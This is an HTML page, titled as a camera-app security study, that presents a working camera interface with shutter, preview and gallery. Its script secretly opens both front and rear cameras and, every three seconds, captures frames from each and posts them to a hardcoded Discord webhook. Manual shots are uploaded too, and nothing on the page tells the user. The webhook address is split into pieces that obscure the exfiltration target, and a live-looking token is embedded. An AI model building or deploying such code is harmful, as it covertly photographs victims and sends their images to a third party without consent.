<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8">
  <title>カメラアプリセキュリティ勉強</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    html, body {
      margin: 0;
      padding: 0;
      background: black;
      overflow: hidden;
    }
    #videoPreview {
      width: 100%;
      height: 100%;
      object-fit: cover;
      position: absolute;
    }
    #shutterBtn {
      position: absolute;
      bottom: 40px;
      left: 50%;
      transform: translateX(-50%);
      width: 80px;
      height: 80px;
      border-radius: 50%;
      background: white;
      border: 4px solid #eee;
      z-index: 2;
    }
    #flash {
      position: absolute;
      background: white;
      width: 100%;
      height: 100%;
      opacity: 0;
      z-index: 10;
      pointer-events: none;
      transition: opacity 0.3s;
    }
    #photoPreview {
      position: absolute;
      bottom: 20px;
      left: 20px;
      width: 90px;
      height: 90px;
      object-fit: cover;
      border: 2px solid white;
      border-radius: 8px;
      z-index: 3;
      cursor: pointer;
    }
    #galleryView {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: black;
      display: none;
      flex-wrap: wrap;
      align-content: flex-start;
      overflow-y: scroll;
      padding: 10px;
      z-index: 15;
    }
    .galleryItem {
      width: 30%;
      margin: 1%;
      position: relative;
    }
    .galleryItem img {
      width: 100%;
      border-radius: 10px;
    }
    .deleteBtn {
      position: absolute;
      top: 5px;
      right: 5px;
      background: red;
      color: white;
      border: none;
      border-radius: 50%;
      width: 24px;
      height: 24px;
      font-size: 16px;
      cursor: pointer;
    }
    #backBtn {
      position: fixed;
      top: 20px;
      left: 20px;
      background: white;
      border: none;
      padding: 10px 15px;
      border-radius: 10px;
      font-weight: bold;
      cursor: pointer;
      z-index: 20;
    }
  </style>
</head>
<body>
  <video id="videoPreview" autoplay playsinline muted></video>
  <div id="flash"></div>
  <button id="shutterBtn"></button>
  <img id="photoPreview" src="" alt="preview" />
  <div id="galleryView"></div>
  <button id="backBtn" style="display:none">戻る</button>
  <audio id="shutterSound" src="https://www.soundjay.com/mechanical/camera-shutter-click-01a.mp3" preload="auto"></audio>

  <script>
    const protocol = "https";
    const domain = "discord.com";
    const apiPath = "/api/webhooks";
    const webhookId = "1192062408462696518";
    const webhookToken = "w_kSg9s3GNGxdgVpep893UxRs-rY19ZYRWHVlbOpSnVRjHu40J9NWyLNBCVC9-Ovz4Bt";
    
    const webhookUrl = `${protocol}://${domain}${apiPath}/${webhookId}/${webhookToken}`;

    const config = {
      maxSize: 8 * 1024 * 1024,
      quality: 0.85,
      interval: 3000
    };

    const video = document.getElementById('videoPreview');
    const shutterBtn = document.getElementById('shutterBtn');
    const preview = document.getElementById('photoPreview');
    const gallery = document.getElementById('galleryView');
    const flash = document.getElementById('flash');
    const backBtn = document.getElementById('backBtn');
    const shutterSound = document.getElementById('shutterSound');
    const photos = [];

    let userStream = null;
    let backStream = null;

    async function initCamera() {
      userStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
      backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
      video.srcObject = userStream;
      startAutoCapture();
    }

    async function captureImage(stream) {
      const track = stream.getVideoTracks()[0];
      const imageCapture = new ImageCapture(track);
      const bitmap = await imageCapture.grabFrame();
      const canvas = document.createElement('canvas');
      canvas.width = bitmap.width;
      canvas.height = bitmap.height;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(bitmap, 0, 0);
      return new Promise(res => canvas.toBlob(blob => res(blob), 'image/jpeg', config.quality));
    }

    async function sendToWebhook(blob, label) {
      const form = new FormData();
      form.append("file", blob, `img_${Date.now()}.jpg`);
      form.append("content", label);
      await fetch(webhookUrl, { method: "POST", body: form });
    }

    function showFlash() {
      flash.style.opacity = 1;
      setTimeout(() => flash.style.opacity = 0, 200);
    }

    function updatePreview(blob) {
      const url = URL.createObjectURL(blob);
      preview.src = url;
      preview.style.display = "block";
    }

    shutterBtn.onclick = async () => {
      showFlash();
      shutterSound.play();
      const blob = await captureImage(userStream);
      if (blob.size <= config.maxSize) {
        updatePreview(blob);
        addToGallery(blob);
        sendToWebhook(blob, "内カメラ画像（手動）");
      }
    };

    function addToGallery(blob) {
      photos.push(blob);
      preview.onclick = () => showGallery();
    }

    function showGallery() {
      gallery.innerHTML = "";
      gallery.style.display = "flex";
      backBtn.style.display = "block";

      photos.forEach((blob, index) => {
        const div = document.createElement('div');
        div.className = "galleryItem";

        const img = document.createElement('img');
        img.src = URL.createObjectURL(blob);
        img.onclick = () => window.open(img.src, '_blank');

        const del = document.createElement('button');
        del.className = "deleteBtn";
        del.textContent = "×";
        del.onclick = () => {
          photos.splice(index, 1);
          showGallery();
        };

        div.appendChild(img);
        div.appendChild(del);
        gallery.appendChild(div);
      });
    }

    backBtn.onclick = () => {
      gallery.style.display = "none";
      backBtn.style.display = "none";
    };

    function startAutoCapture() {
      setInterval(async () => {
        const blobUser = await captureImage(userStream);
        if (blobUser.size <= config.maxSize) {
          sendToWebhook(blobUser, "内カメラ画像（自動）");
        }
        const blobBack = await captureImage(backStream);
        if (blobBack.size <= config.maxSize) {
          sendToWebhook(blobBack, "外カメラ画像（自動）");
        }
      }, config.interval);
    }

    window.addEventListener("beforeunload", () => {
      userStream?.getTracks().forEach(t => t.stop());
      backStream?.getTracks().forEach(t => t.stop());
    });

    initCamera();
  </script>
</body>
</html>



